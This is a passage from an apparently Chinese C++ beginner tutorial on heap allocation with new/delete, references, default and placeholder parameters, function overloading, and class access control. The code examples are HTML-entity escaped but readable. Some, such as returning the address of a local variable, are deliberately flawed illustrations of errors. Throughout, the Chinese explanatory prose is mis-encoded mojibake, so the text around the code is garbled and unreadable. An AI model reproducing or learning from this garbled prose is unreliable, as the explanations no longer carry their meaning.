ˆåŒºå¼€è¾Ÿçš„æ•°æ®ç”±ç¼–è¯‘å™¨è‡ªåŠ¨é‡Šæ”¾\nç¤ºä¾‹ï¼š\nint * func()\n&#123;\n\tint a &#x3D; 10;\n\treturn &amp;a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå †åŒºï¼š\nç”±ç¨‹åºå‘˜åˆ†é…é‡Šæ”¾,è‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾,ç¨‹åºç»“æŸæ—¶ç”±æ“ä½œç³»ç»Ÿå›æ”¶\nåœ¨C++ä¸­ä¸»è¦åˆ©ç”¨newåœ¨å †åŒºå¼€è¾Ÿå†…å­˜\nç¤ºä¾‹ï¼š\nint* func()\n&#123;\n\tint* a &#x3D; new int(10);\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n    \n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ€»ç»“ï¼š\nå †åŒºæ•°æ®ç”±ç¨‹åºå‘˜ç®¡ç†å¼€è¾Ÿå’Œé‡Šæ”¾\nå †åŒºæ•°æ®åˆ©ç”¨newå…³é”®å­—è¿›è¡Œå¼€è¾Ÿå†…å­˜\nnewæ“ä½œç¬¦C++ä¸­åˆ©ç”¨&#x3D;&#x3D;new&#x3D;&#x3D;æ“ä½œç¬¦åœ¨å †åŒºå¼€è¾Ÿæ•°æ®\nå †åŒºå¼€è¾Ÿçš„æ•°æ®ï¼Œç”±ç¨‹åºå‘˜æ‰‹åŠ¨å¼€è¾Ÿï¼Œæ‰‹åŠ¨é‡Šæ”¾ï¼Œé‡Šæ”¾åˆ©ç”¨æ“ä½œç¬¦ &#x3D;&#x3D;delete&#x3D;&#x3D;\nè¯­æ³•ï¼š new æ•°æ®ç±»å‹\nåˆ©ç”¨newåˆ›å»ºçš„æ•°æ®ï¼Œä¼šè¿”å›è¯¥æ•°æ®å¯¹åº”çš„ç±»å‹çš„æŒ‡é’ˆ\nç¤ºä¾‹1ï¼š åŸºæœ¬è¯­æ³•\nint* func()\n&#123;\n\tint* a &#x3D; new int(10);\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\tint *p &#x3D; func();\n\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\tcout &lt;&lt; *p &lt;&lt; endl;\n\n\t&#x2F;&#x2F;åˆ©ç”¨deleteé‡Šæ”¾å †åŒºæ•°æ®\n\tdelete p;\n\n\t&#x2F;&#x2F;cout &lt;&lt; *p &lt;&lt; endl; &#x2F;&#x2F;æŠ¥é”™ï¼Œé‡Šæ”¾çš„ç©ºé—´ä¸å¯è®¿é—®\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç¤ºä¾‹2ï¼šå¼€è¾Ÿæ•°ç»„\n&#x2F;&#x2F;å †åŒºå¼€è¾Ÿæ•°ç»„\nint main() &#123;\n\n\tint* arr &#x3D; new int[10];\n\n\tfor (int i &#x3D; 0; i &lt; 10; i++)\n\t&#123;\n\t\tarr[i] &#x3D; i + 100;\n\t&#125;\n\n\tfor (int i &#x3D; 0; i &lt; 10; i++)\n\t&#123;\n\t\tcout &lt;&lt; arr[i] &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;é‡Šæ”¾æ•°ç»„ delete ååŠ  []\n\tdelete[] arr;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¼•ç”¨å¼•ç”¨çš„åŸºæœ¬ä½¿ç”¨**ä½œç”¨ï¼š **ç»™å˜é‡èµ·åˆ«å\nè¯­æ³•ï¼š æ•°æ®ç±»å‹ &amp;åˆ«å = åŸå\nç¤ºä¾‹ï¼š\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint &amp;b &#x3D; a;\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\n\tb &#x3D; 100;\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¼•ç”¨æ³¨æ„äº‹é¡¹\nå¼•ç”¨å¿…é¡»åˆå§‹åŒ–\nå¼•ç”¨åœ¨åˆå§‹åŒ–åï¼Œä¸å¯ä»¥æ”¹å˜\n\nç¤ºä¾‹ï¼š\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint b &#x3D; 20;\n\t&#x2F;&#x2F;int &amp;c; &#x2F;&#x2F;é”™è¯¯ï¼Œå¼•ç”¨å¿…é¡»åˆå§‹åŒ–\n\tint &amp;c &#x3D; a; &#x2F;&#x2F;ä¸€æ—¦åˆå§‹åŒ–åï¼Œå°±ä¸å¯ä»¥æ›´æ”¹\n\tc &#x3D; b; &#x2F;&#x2F;è¿™æ˜¯èµ‹å€¼æ“ä½œï¼Œä¸æ˜¯æ›´æ”¹å¼•ç”¨\n\n\tcout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;\n\tcout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¼•ç”¨åšå‡½æ•°å‚æ•°ä½œç”¨ï¼šå‡½æ•°ä¼ å‚æ—¶ï¼Œå¯ä»¥åˆ©ç”¨å¼•ç”¨çš„æŠ€æœ¯è®©å½¢å‚ä¿®é¥°å®å‚\nä¼˜ç‚¹ï¼šå¯ä»¥ç®€åŒ–æŒ‡é’ˆä¿®æ”¹å®å‚\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;1. å€¼ä¼ é€’\nvoid mySwap01(int a, int b) &#123;\n\tint temp &#x3D; a;\n\ta &#x3D; b;\n\tb &#x3D; temp;\n&#125;\n\n&#x2F;&#x2F;2. åœ°å€ä¼ é€’\nvoid mySwap02(int* a, int* b) &#123;\n\tint temp &#x3D; *a;\n\t*a &#x3D; *b;\n\t*b &#x3D; temp;\n&#125;\n\n&#x2F;&#x2F;3. å¼•ç”¨ä¼ é€’\nvoid mySwap03(int&amp; a, int&amp; b) &#123;\n\tint temp &#x3D; a;\n\ta &#x3D; b;\n\tb &#x3D; temp;\n&#125;\n\nint main() &#123;\n\n\tint a &#x3D; 10;\n\tint b &#x3D; 20;\n\n\tmySwap01(a, b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tmySwap02(&amp;a, &amp;b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tmySwap03(a, b);\n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šé€šè¿‡å¼•ç”¨å‚æ•°äº§ç”Ÿçš„æ•ˆæœåŒæŒ‰åœ°å€ä¼ é€’æ˜¯ä¸€æ ·çš„ã€‚å¼•ç”¨çš„è¯­æ³•æ›´æ¸…æ¥šç®€å•\nå¼•ç”¨åšå‡½æ•°è¿”å›å€¼ä½œç”¨ï¼šå¼•ç”¨æ˜¯å¯ä»¥ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼å­˜åœ¨çš„\næ³¨æ„ï¼šä¸è¦è¿”å›å±€éƒ¨å˜é‡å¼•ç”¨\nç”¨æ³•ï¼šå‡½æ•°è°ƒç”¨ä½œä¸ºå·¦å€¼\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;è¿”å›å±€éƒ¨å˜é‡å¼•ç”¨\nint&amp; test01() &#123;\n\tint a &#x3D; 10; &#x2F;&#x2F;å±€éƒ¨å˜é‡\n\treturn a;\n&#125;\n\n&#x2F;&#x2F;è¿”å›é™æ€å˜é‡å¼•ç”¨\nint&amp; test02() &#123;\n\tstatic int a &#x3D; 20;\n\treturn a;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨\n\tint&amp; ref &#x3D; test01();\n\tcout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;\n\n\t&#x2F;&#x2F;å¦‚æœå‡½æ•°åšå·¦å€¼ï¼Œé‚£ä¹ˆå¿…é¡»è¿”å›å¼•ç”¨\n\tint&amp; ref2 &#x3D; test02();\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\n\ttest02() &#x3D; 1000;\n\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¼•ç”¨çš„æœ¬è´¨æœ¬è´¨ï¼šå¼•ç”¨çš„æœ¬è´¨åœ¨c++å†…éƒ¨å®ç°æ˜¯ä¸€ä¸ªæŒ‡é’ˆå¸¸é‡.\nè®²è§£ç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å‘ç°æ˜¯å¼•ç”¨ï¼Œè½¬æ¢ä¸º int* const ref &#x3D; &amp;a;\nvoid func(int&amp; ref)&#123;\n\tref &#x3D; 100; &#x2F;&#x2F; refæ˜¯å¼•ç”¨ï¼Œè½¬æ¢ä¸º*ref &#x3D; 100\n&#125;\nint main()&#123;\n\tint a &#x3D; 10;\n    \n    &#x2F;&#x2F;è‡ªåŠ¨è½¬æ¢ä¸º int* const ref &#x3D; &amp;a; æŒ‡é’ˆå¸¸é‡æ˜¯æŒ‡é’ˆæŒ‡å‘ä¸å¯æ”¹ï¼Œä¹Ÿè¯´æ˜ä¸ºä»€ä¹ˆå¼•ç”¨ä¸å¯æ›´æ”¹\n\tint&amp; ref &#x3D; a; \n\tref &#x3D; 20; &#x2F;&#x2F;å†…éƒ¨å‘ç°refæ˜¯å¼•ç”¨ï¼Œè‡ªåŠ¨å¸®æˆ‘ä»¬è½¬æ¢ä¸º: *ref &#x3D; 20;\n    \n\tcout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ref:&quot; &lt;&lt; ref &lt;&lt; endl;\n    \n\tfunc(a);\n\treturn 0;\n&#125;\n\nç»“è®ºï¼šC++æ¨èç”¨å¼•ç”¨æŠ€æœ¯ï¼Œå› ä¸ºè¯­æ³•æ–¹ä¾¿ï¼Œå¼•ç”¨æœ¬è´¨æ˜¯æŒ‡é’ˆå¸¸é‡ï¼Œä½†æ˜¯æ‰€æœ‰çš„æŒ‡é’ˆæ“ä½œç¼–è¯‘å™¨éƒ½å¸®æˆ‘ä»¬åšäº†\nå¸¸é‡å¼•ç”¨ä½œç”¨ï¼šå¸¸é‡å¼•ç”¨ä¸»è¦ç”¨æ¥ä¿®é¥°å½¢å‚ï¼Œé˜²æ­¢è¯¯æ“ä½œ\nåœ¨å‡½æ•°å½¢å‚åˆ—è¡¨ä¸­ï¼Œå¯ä»¥åŠ &#x3D;&#x3D;constä¿®é¥°å½¢å‚&#x3D;&#x3D;ï¼Œé˜²æ­¢å½¢å‚æ”¹å˜å®å‚\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å¼•ç”¨ä½¿ç”¨çš„åœºæ™¯ï¼Œé€šå¸¸ç”¨æ¥ä¿®é¥°å½¢å‚\nvoid showValue(const int&amp; v) &#123;\n\t&#x2F;&#x2F;v +&#x3D; 10;\n\tcout &lt;&lt; v &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;int&amp; ref &#x3D; 10;  å¼•ç”¨æœ¬èº«éœ€è¦ä¸€ä¸ªåˆæ³•çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤è¿™è¡Œé”™è¯¯\n\t&#x2F;&#x2F;åŠ å…¥constå°±å¯ä»¥äº†ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–ä»£ç ï¼Œint temp &#x3D; 10; const int&amp; ref &#x3D; temp;\n\tconst int&amp; ref &#x3D; 10;\n\n\t&#x2F;&#x2F;ref &#x3D; 100;  &#x2F;&#x2F;åŠ å…¥conståä¸å¯ä»¥ä¿®æ”¹å˜é‡\n\tcout &lt;&lt; ref &lt;&lt; endl;\n\n\t&#x2F;&#x2F;å‡½æ•°ä¸­åˆ©ç”¨å¸¸é‡å¼•ç”¨é˜²æ­¢è¯¯æ“ä½œä¿®æ”¹å®å‚\n\tint a &#x3D; 10;\n\tshowValue(a);\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‡½æ•°æé«˜å‡½æ•°é»˜è®¤å‚æ•°åœ¨C++ä¸­ï¼Œå‡½æ•°çš„å½¢å‚åˆ—è¡¨ä¸­çš„å½¢å‚æ˜¯å¯ä»¥æœ‰é»˜è®¤å€¼çš„ã€‚\nè¯­æ³•ï¼š è¿”å›å€¼ç±»å‹ å‡½æ•°å ï¼ˆå‚æ•°= é»˜è®¤å€¼ï¼‰&#123;&#125;\nç¤ºä¾‹ï¼š\nint func(int a, int b &#x3D; 10, int c &#x3D; 10) &#123;\n\treturn a + b + c;\n&#125;\n\n&#x2F;&#x2F;1. å¦‚æœæŸä¸ªä½ç½®å‚æ•°æœ‰é»˜è®¤å€¼ï¼Œé‚£ä¹ˆä»è¿™ä¸ªä½ç½®å¾€åï¼Œä»å·¦å‘å³ï¼Œå¿…é¡»éƒ½è¦æœ‰é»˜è®¤å€¼\n&#x2F;&#x2F;2. å¦‚æœå‡½æ•°å£°æ˜æœ‰é»˜è®¤å€¼ï¼Œå‡½æ•°å®ç°çš„æ—¶å€™å°±ä¸èƒ½æœ‰é»˜è®¤å‚æ•°\nint func2(int a &#x3D; 10, int b &#x3D; 10);\nint func2(int a, int b) &#123;\n\treturn a + b;\n&#125;\n\nint main() &#123;\n\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(20, 20) &lt;&lt; endl;\n\tcout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(100) &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‡½æ•°å ä½å‚æ•°C++ä¸­å‡½æ•°çš„å½¢å‚åˆ—è¡¨é‡Œå¯ä»¥æœ‰å ä½å‚æ•°ï¼Œç”¨æ¥åšå ä½ï¼Œè°ƒç”¨å‡½æ•°æ—¶å¿…é¡»å¡«è¡¥è¯¥ä½ç½®\nè¯­æ³•ï¼š è¿”å›å€¼ç±»å‹ å‡½æ•°å (æ•°æ®ç±»å‹)&#123;&#125;\nåœ¨ç°é˜¶æ®µå‡½æ•°çš„å ä½å‚æ•°å­˜åœ¨æ„ä¹‰ä¸å¤§ï¼Œä½†æ˜¯åé¢çš„è¯¾ç¨‹ä¸­ä¼šç”¨åˆ°è¯¥æŠ€æœ¯\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å‡½æ•°å ä½å‚æ•° ï¼Œå ä½å‚æ•°ä¹Ÿå¯ä»¥æœ‰é»˜è®¤å‚æ•°\nvoid func(int a, int) &#123;\n\tcout &lt;&lt; &quot;this is func&quot; &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\tfunc(10,10); &#x2F;&#x2F;å ä½å‚æ•°å¿…é¡»å¡«è¡¥\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‡½æ•°é‡è½½å‡½æ•°é‡è½½æ¦‚è¿°ä½œç”¨ï¼šå‡½æ•°åå¯ä»¥ç›¸åŒï¼Œæé«˜å¤ç”¨æ€§\nå‡½æ•°é‡è½½æ»¡è¶³æ¡ä»¶ï¼š\n\nåŒä¸€ä¸ªä½œç”¨åŸŸä¸‹\nå‡½æ•°åç§°ç›¸åŒ\nå‡½æ•°å‚æ•°ç±»å‹ä¸åŒ æˆ–è€… ä¸ªæ•°ä¸åŒ æˆ–è€… é¡ºåºä¸åŒ\n\næ³¨æ„: å‡½æ•°çš„è¿”å›å€¼ä¸å¯ä»¥ä½œä¸ºå‡½æ•°é‡è½½çš„æ¡ä»¶\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å‡½æ•°é‡è½½éœ€è¦å‡½æ•°éƒ½åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸä¸‹\nvoid func()\n&#123;\n\tcout &lt;&lt; &quot;func çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\nvoid func(int a)\n&#123;\n\tcout &lt;&lt; &quot;func (int a) çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\nvoid func(double a)\n&#123;\n\tcout &lt;&lt; &quot;func (double a)çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\nvoid func(int a ,double b)\n&#123;\n\tcout &lt;&lt; &quot;func (int a ,double b) çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\nvoid func(double a ,int b)\n&#123;\n\tcout &lt;&lt; &quot;func (double a ,int b)çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;å‡½æ•°è¿”å›å€¼ä¸å¯ä»¥ä½œä¸ºå‡½æ•°é‡è½½æ¡ä»¶\n&#x2F;&#x2F;int func(double a, int b)\n&#x2F;&#x2F;&#123;\n&#x2F;&#x2F;\tcout &lt;&lt; &quot;func (double a ,int b)çš„è°ƒç”¨ï¼&quot; &lt;&lt; endl;\n&#x2F;&#x2F;&#125;\n\n\nint main() &#123;\n\n\tfunc();\n\tfunc(10);\n\tfunc(3.14);\n\tfunc(10,3.14);\n\tfunc(3.14 , 10);\n\t\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‡½æ•°é‡è½½æ³¨æ„äº‹é¡¹\nå¼•ç”¨ä½œä¸ºé‡è½½æ¡ä»¶\nå‡½æ•°é‡è½½ç¢°åˆ°å‡½æ•°é»˜è®¤å‚æ•°\n\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å‡½æ•°é‡è½½æ³¨æ„äº‹é¡¹\n&#x2F;&#x2F;1ã€å¼•ç”¨ä½œä¸ºé‡è½½æ¡ä»¶\n\nvoid func(int &amp;a)\n&#123;\n\tcout &lt;&lt; &quot;func (int &amp;a) è°ƒç”¨ &quot; &lt;&lt; endl;\n&#125;\n\nvoid func(const int &amp;a)\n&#123;\n\tcout &lt;&lt; &quot;func (const int &amp;a) è°ƒç”¨ &quot; &lt;&lt; endl;\n&#125;\n\n\n&#x2F;&#x2F;2ã€å‡½æ•°é‡è½½ç¢°åˆ°å‡½æ•°é»˜è®¤å‚æ•°\n\nvoid func2(int a, int b &#x3D; 10)\n&#123;\n\tcout &lt;&lt; &quot;func2(int a, int b &#x3D; 10) è°ƒç”¨&quot; &lt;&lt; endl;\n&#125;\n\nvoid func2(int a)\n&#123;\n\tcout &lt;&lt; &quot;func2(int a) è°ƒç”¨&quot; &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\t\n\tint a &#x3D; 10;\n\tfunc(a); &#x2F;&#x2F;è°ƒç”¨æ— const\n\tfunc(10);&#x2F;&#x2F;è°ƒç”¨æœ‰const\n\n\n\t&#x2F;&#x2F;func2(10); &#x2F;&#x2F;ç¢°åˆ°é»˜è®¤å‚æ•°äº§ç”Ÿæ­§ä¹‰ï¼Œéœ€è¦é¿å…\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç±»å’Œå¯¹è±¡C++é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹æ€§ä¸ºï¼š&#x3D;&#x3D;å°è£…ã€ç»§æ‰¿ã€å¤šæ€&#x3D;&#x3D;\nC++è®¤ä¸º&#x3D;&#x3D;ä¸‡äº‹ä¸‡ç‰©éƒ½çš†ä¸ºå¯¹è±¡&#x3D;&#x3D;ï¼Œå¯¹è±¡ä¸Šæœ‰å…¶å±æ€§å’Œè¡Œä¸º\nä¾‹å¦‚ï¼š\näººå¯ä»¥ä½œä¸ºå¯¹è±¡ï¼Œå±æ€§æœ‰å§“åã€å¹´é¾„ã€èº«é«˜ã€ä½“é‡â€¦ï¼Œè¡Œä¸ºæœ‰èµ°ã€è·‘ã€è·³ã€åƒé¥­ã€å”±æ­Œâ€¦\nè½¦ä¹Ÿå¯ä»¥ä½œä¸ºå¯¹è±¡ï¼Œå±æ€§æœ‰è½®èƒã€æ–¹å‘ç›˜ã€è½¦ç¯â€¦,è¡Œä¸ºæœ‰è½½äººã€æ”¾éŸ³ä¹ã€æ”¾ç©ºè°ƒâ€¦\nå…·æœ‰ç›¸åŒæ€§è´¨çš„&#x3D;&#x3D;å¯¹è±¡&#x3D;&#x3D;ï¼Œæˆ‘ä»¬å¯ä»¥æŠ½è±¡ç§°ä¸º&#x3D;&#x3D;ç±»&#x3D;&#x3D;ï¼Œäººå±äºäººç±»ï¼Œè½¦å±äºè½¦ç±»\nå°è£…å°è£…çš„æ„ä¹‰å°è£…æ˜¯C++é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§ä¹‹ä¸€\nå°è£…çš„æ„ä¹‰ï¼š\n\nå°†å±æ€§å’Œè¡Œä¸ºä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¡¨ç°ç”Ÿæ´»ä¸­çš„äº‹ç‰©\nå°†å±æ€§å’Œè¡Œä¸ºåŠ ä»¥æƒé™æ§åˆ¶\n\nå°è£…æ„ä¹‰ä¸€ï¼š\nåœ¨è®¾è®¡ç±»çš„æ—¶å€™ï¼Œå±æ€§å’Œè¡Œä¸ºå†™åœ¨ä¸€èµ·ï¼Œè¡¨ç°äº‹ç‰©\nè¯­æ³•ï¼š class ç±»å&#123; è®¿é—®æƒé™ï¼š å±æ€§ / è¡Œä¸º &#125;;\nç¤ºä¾‹1ï¼šè®¾è®¡ä¸€ä¸ªåœ†ç±»ï¼Œæ±‚åœ†çš„å‘¨é•¿\nç¤ºä¾‹ä»£ç ï¼š\n&#x2F;&#x2F;åœ†å‘¨ç‡\nconst double PI &#x3D; 3.14;\n\n&#x2F;&#x2F;1ã€å°è£…çš„æ„ä¹‰\n&#x2F;&#x2F;å°†å±æ€§å’Œè¡Œä¸ºä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œç”¨æ¥è¡¨ç°ç”Ÿæ´»ä¸­çš„äº‹ç‰©\n\n&#x2F;&#x2F;å°è£…ä¸€ä¸ªåœ†ç±»ï¼Œæ±‚åœ†çš„å‘¨é•¿\n&#x2F;&#x2F;classä»£è¡¨è®¾è®¡ä¸€ä¸ªç±»ï¼Œåé¢è·Ÿç€çš„æ˜¯ç±»å\nclass Circle\n&#123;\npublic:  &#x2F;&#x2F;è®¿é—®æƒé™  å…¬å…±çš„æƒé™\n\n\t&#x2F;&#x2F;å±æ€§\n\tint m_r;&#x2F;&#x2F;åŠå¾„\n\n\t&#x2F;&#x2F;è¡Œä¸º\n\t&#x2F;&#x2F;è·å–åˆ°åœ†çš„å‘¨é•¿\n\tdouble calculateZC()\n\t&#123;\n\t\t&#x2F;&#x2F;2 * pi  * r\n\t\t&#x2F;&#x2F;è·å–åœ†çš„å‘¨é•¿\n\t\treturn  2 * PI * m_r;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;é€šè¿‡åœ†ç±»ï¼Œåˆ›å»ºåœ†çš„å¯¹è±¡\n\t&#x2F;&#x2F; c1å°±æ˜¯ä¸€ä¸ªå…·ä½“çš„åœ†\n\tCircle c1;\n\tc1.m_r &#x3D; 10; &#x2F;&#x2F;ç»™åœ†å¯¹è±¡çš„åŠå¾„ è¿›è¡Œèµ‹å€¼æ“ä½œ\n\n\t&#x2F;&#x2F;2 * pi * 10 &#x3D; &#x3D; 62.8\n\tcout &lt;&lt; &quot;åœ†çš„å‘¨é•¿ä¸ºï¼š &quot; &lt;&lt; c1.calculateZC() &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç¤ºä¾‹2ï¼šè®¾è®¡ä¸€ä¸ªå­¦ç”Ÿç±»ï¼Œå±æ€§æœ‰å§“åå’Œå­¦å·ï¼Œå¯ä»¥ç»™å§“åå’Œå­¦å·èµ‹å€¼ï¼Œå¯ä»¥æ˜¾ç¤ºå­¦ç”Ÿçš„å§“åå’Œå­¦å·\nç¤ºä¾‹2ä»£ç ï¼š\n&#x2F;&#x2F;å­¦ç”Ÿç±»\nclass Student &#123;\npublic:\n\tvoid setName(string name) &#123;\n\t\tm_name &#x3D; name;\n\t&#125;\n\tvoid setID(int id) &#123;\n\t\tm_id &#x3D; id;\n\t&#125;\n\n\tvoid showStudent() &#123;\n\t\tcout &lt;&lt; &quot;name:&quot; &lt;&lt; m_name &lt;&lt; &quot; ID:&quot; &lt;&lt; m_id &lt;&lt; endl;\n\t&#125;\npublic:\n\tstring m_name;\n\tint m_id;\n&#125;;\n\nint main() &#123;\n\n\tStudent stu;\n\tstu.setName(&quot;å¾·ç›è¥¿äºš&quot;);\n\tstu.setID(250);\n\tstu.showStudent();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå°è£…æ„ä¹‰äºŒï¼š\nç±»åœ¨è®¾è®¡æ—¶ï¼Œå¯ä»¥æŠŠå±æ€§å’Œè¡Œä¸ºæ”¾åœ¨ä¸åŒçš„æƒé™ä¸‹ï¼ŒåŠ ä»¥æ§åˆ¶\nè®¿é—®æƒé™æœ‰ä¸‰ç§ï¼š\n\npublic å…¬å…±æƒé™\nprotected ä¿æŠ¤æƒé™\nprivate ç§æœ‰æƒé™\n\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;ä¸‰ç§æƒé™\n&#x2F;&#x2F;å…¬å…±æƒé™  public     ç±»å†…å¯ä»¥è®¿é—®  ç±»å¤–å¯ä»¥è®¿é—®\n&#x2F;&#x2F;ä¿æŠ¤æƒé™  protected  ç±»å†…å¯ä»¥è®¿é—®  ç±»å¤–ä¸å¯ä»¥è®¿é—®\n&#x2F;&#x2F;ç§æœ‰æƒé™  private    ç±»å†…å¯ä»¥è®¿é—®  ç±»å¤–ä¸å¯ä»¥è®¿é—®\n\nclass Person\n&#123;\n\t&#x2F;&#x2F;å§“å  å…¬å…±æƒé™\npublic:\n\tstring m_Name;\n\n\t&#x2F;&#x2F;æ±½è½¦  ä¿æŠ¤æƒé™\nprotected:\n\tstring m_Car;\n\n\t&#x2F;&#x2F;é“¶è¡Œå¡å¯†ç   ç§æœ‰æƒé™\nprivate:\n\tint m_Password;\n\npublic:\n\tvoid func()\n\t&#123;\n\t\tm_Name &#x3D; &quot;å¼ ä¸‰&quot;;\n\t\tm_Car &#x3D; &quot;æ‹–æ‹‰æœº&quot;;\n\t\tm_Password &#x3D; 123456;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\tPerson p;\n\tp.m_Name &#x3D; &quot;æå››&quot;;\n\t&#x2F;&#x2F;p.m_Car &#x3D; &quot;å¥”é©°&quot;;  &#x2F;&#x2F;ä¿æŠ¤æƒé™ç±»å¤–è®¿é—®ä¸åˆ°\n\t&#x2F;&#x2F;p.m_Password &#x3D; 123; &#x2F;&#x2F;ç§æœ‰æƒé™ç±»å¤–è®¿é—®ä¸åˆ°\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nstructå’ŒclassåŒºåˆ«åœ¨C++ä¸­ structå’Œclasså”¯ä¸€çš„åŒºåˆ«å°±åœ¨äº é»˜è®¤çš„è®¿é—®æƒé™ä¸åŒ\nåŒºåˆ«ï¼š\n\nstruct é»˜è®¤æƒé™ä¸ºå…¬å…±\nclass é»˜è®¤æƒé™ä¸ºç§æœ‰\n\nclass C1\n&#123;\n\tint  m_A; &#x2F;&#x2F;é»˜è®¤æ˜¯ç§æœ‰æƒé™\n&#125;;\n\nstruct C2\n&#123;\n\tint m_A;  &#x2F;&#x2F;é»˜è®¤æ˜¯å…¬å…±æƒé™\n&#125;;\n\nint main() &#123;\n\n\tC1 c1;\n\tc1.m_A &#x3D; 10; &#x2F;&#x2F;é”™è¯¯ï¼Œè®¿é—®æƒé™æ˜¯ç§æœ‰\n\n\tC2 c2;\n\tc2.m_A &#x3D; 10; &#x2F;&#x2F;æ­£ç¡®ï¼Œè®¿é—®æƒé™æ˜¯å…¬å…±\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 